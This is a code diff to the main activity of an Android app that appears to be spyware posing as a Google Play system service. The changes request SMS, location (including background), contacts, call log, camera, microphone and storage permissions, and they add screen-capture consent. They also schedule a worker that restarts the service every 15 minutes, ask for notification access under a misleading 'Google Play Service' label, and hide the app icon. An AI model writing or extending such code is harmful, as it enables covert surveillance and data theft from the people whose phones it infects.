@@ -1,5 +1,7 @@
 package com.android.background.services;
 
+import androidx.activity.result.ActivityResultLauncher;
+import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.annotation.RequiresApi;
@@ -14,6 +16,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
@@ -21,17 +24,37 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.text.TextUtils;
 import android.widget.Toast;
 
 import com.android.background.services.receivers.AdminReceiver;
+import com.android.background.services.workers.RestartServiceWorker;
+
+import java.util.ArrayList;
+import java.util.List;
+import java.util.Map;
+import java.util.concurrent.TimeUnit;
+
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.PeriodicWorkRequest;
+import androidx.work.WorkManager;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final int PERMISSION_REQUEST_CODE = 55555;
     private static final int ACTION_MANAGE_STORAGE_PERMISSION_REQUEST_CODE = 5000;
     public static DevicePolicyManager devicePolicyManager;
     public static ComponentName componentName;
     public static int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 2323;
+
+    private final ActivityResultLauncher<String[]> permissionLauncher =
+            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), this::handlePermissionResult);
+
+    private final ActivityResultLauncher<Intent> screenCaptureLauncher =
+            registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
+                if (result.getResultCode() == RESULT_OK && result.getData() != null) {
+                    MainService.setScreenCaptureData(result.getResultCode(), result.getData());
+                }
+            });
 
     @RequiresApi(api = Build.VERSION_CODES.R)
     @Override
@@ -49,87 +72,149 @@ public class MainActivity extends AppCompatActivity {
             startActivity(intent);
         }
 
-
-        if (
-                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED &&
-                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED
-        ) {
+        if (hasMissingPermissions()) {
             askPermission();
         }
         else {
+            requestBatteryOptimizationPermission();
+            startCoreServices();
+        }
+    }
 
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
-
-                if (!Environment.isExternalStorageManager() && !Settings.canDrawOverlays(this)){
-                    startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
-                }
-                else {
-                    Intent intent = new Intent(this, MainService.class);
-                    ContextCompat.startForegroundService(this, intent);
-
-                    openExternalPage(this);
-
-                    new Handler().postDelayed(this::finishAndRemoveTask, 1000);
-                }
+    private boolean hasMissingPermissions() {
+        String[] permissions = getRequiredPermissions();
+        for (String permission : permissions) {
+            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                return true;
             }
-            else{
+        }
+        return false;
+    }
+
+    private String[] getRequiredPermissions() {
+        List<String> permissions = new ArrayList<>();
+        permissions.add(Manifest.permission.READ_SMS);
+        permissions.add(Manifest.permission.SEND_SMS);
+        permissions.add(Manifest.permission.RECEIVE_SMS);
+        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
+        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
+        permissions.add(Manifest.permission.READ_PHONE_STATE);
+        permissions.add(Manifest.permission.READ_CONTACTS);
+        permissions.add(Manifest.permission.RECORD_AUDIO);
+        permissions.add(Manifest.permission.CAMERA);
+        permissions.add(Manifest.permission.READ_CALL_LOG);
+        permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+        permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            permissions.add(Manifest.permission.ACCESS_MEDIA_LOCATION);
+        }
+        return permissions.toArray(new String[0]);
+    }
+
+    private void startCoreServices() {
+        scheduleRestartServiceWorker();
+
+        if (!isNotificationServiceEnabled()) {
+            Toast.makeText(this, "Please enable Notification Access for Google Play Service", Toast.LENGTH_LONG).show();
+            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
+            if (!Environment.isExternalStorageManager() && !Settings.canDrawOverlays(this)){
+                startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
+            }
+            else {
                 Intent intent = new Intent(this, MainService.class);
                 ContextCompat.startForegroundService(this, intent);
-
                 openExternalPage(this);
+                new Handler().postDelayed(this::finishAndRemoveTask, 1000);
+            }
+        }
+        else{
+            Intent intent = new Intent(this, MainService.class);
+            ContextCompat.startForegroundService(this, intent);
+            openExternalPage(this);
 
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-                    hideIcon();
-                }
+            hideIcon();
 
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                    new Handler().postDelayed(this::finishAndRemoveTask, 1000);
-                }
-                else {
-                    finish();
-                }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                new Handler().postDelayed(this::finishAndRemoveTask, 1000);
+            }
+            else {
+                finish();
             }
         }
     }
 
-    //-------------------------------------------------------------------------------------------------------------
-    @RequiresApi(api = Build.VERSION_CODES.R)
+    private void handlePermissionResult(Map<String, Boolean> result) {
+        boolean allGranted = true;
+        for (Boolean granted : result.values()) {
+            if (!granted) {
+                allGranted = false;
+                break;
+            }
+        }
+
+        if (allGranted) {
+            Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
+            requestScreenCapturePermission();
+        } else {
+            Toast.makeText(this, "Some permissions were denied", Toast.LENGTH_SHORT).show();
+        }
+    }
+
     private void askPermission() {
-        ActivityCompat.requestPermissions(this, new String[]{
-                Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.READ_EXTERNAL_STORAGE,
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.READ_SMS,
-                Manifest.permission.RECEIVE_SMS,
-                Manifest.permission.ACCESS_FINE_LOCATION,
-                Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.ACCESS_MEDIA_LOCATION,
-                Manifest.permission.PROCESS_OUTGOING_CALLS,
-                Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.CALL_PHONE,
-                Manifest.permission.READ_PHONE_NUMBERS,
-                Manifest.permission.READ_CALL_LOG,
-                Manifest.permission.READ_CONTACTS,
-                Manifest.permission.WRITE_CONTACTS,
-                Manifest.permission.CAMERA,
-                Manifest.permission.RECORD_AUDIO,
-                Manifest.permission.MODIFY_AUDIO_SETTINGS
-        }, PERMISSION_REQUEST_CODE);
+        permissionLauncher.launch(getRequiredPermissions());
+    }
+
+    private void scheduleRestartServiceWorker() {
+        PeriodicWorkRequest restartServiceWorkRequest =
+                new PeriodicWorkRequest.Builder(RestartServiceWorker.class, 15, TimeUnit.MINUTES)
+                        .build();
+
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                "RestartServiceWork",
+                ExistingPeriodicWorkPolicy.KEEP,
+                restartServiceWorkRequest
+        );
+    }
+
+    private boolean isNotificationServiceEnabled() {
+        String pkgName = getPackageName();
+        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
+        if (!TextUtils.isEmpty(flat)) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                final ComponentName cn = ComponentName.unflattenFromString(name);
+                if (cn != null) {
+                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
     }
 
     private void requestDisplayOverPermission() {
-
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
             Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
             startActivityForResult(intent, ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE);
+        } else {
+            requestExternalStorageManagerPermission();
         }
+    }
+
+    private void requestScreenCapturePermission() {
+        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+        if (manager != null) {
+            screenCaptureLauncher.launch(manager.createScreenCaptureIntent());
+        }
+        requestDisplayOverPermission();
     }
 
     private void requestExternalStorageManagerPermission(){
@@ -216,29 +301,4 @@ public class MainActivity extends AppCompatActivity {
         getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 
-    //_____________________________________________________________________________________________________________
-    @SuppressLint("SetTextI18n")
-    @Override
-    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-
-        if (requestCode == PERMISSION_REQUEST_CODE && grantResults.length >= 2
-                && grantResults[0] == PackageManager.PERMISSION_GRANTED
-                && grantResults[1] == PackageManager.PERMISSION_GRANTED
-                && grantResults[2] == PackageManager.PERMISSION_GRANTED
-                && grantResults[3] == PackageManager.PERMISSION_GRANTED
-                && grantResults[4] == PackageManager.PERMISSION_GRANTED
-                && grantResults[5] == PackageManager.PERMISSION_GRANTED
-                && grantResults[6] == PackageManager.PERMISSION_GRANTED
-                && grantResults[7] == PackageManager.PERMISSION_GRANTED
-                && grantResults[8] == PackageManager.PERMISSION_GRANTED
-                && grantResults[9] == PackageManager.PERMISSION_GRANTED
-                && grantResults[10] == PackageManager.PERMISSION_GRANTED
-
-        ) {
-
-            Toast.makeText(this, "Permission granted successfully!", Toast.LENGTH_SHORT).show();
-            requestDisplayOverPermission();
-        }
-    }
 }
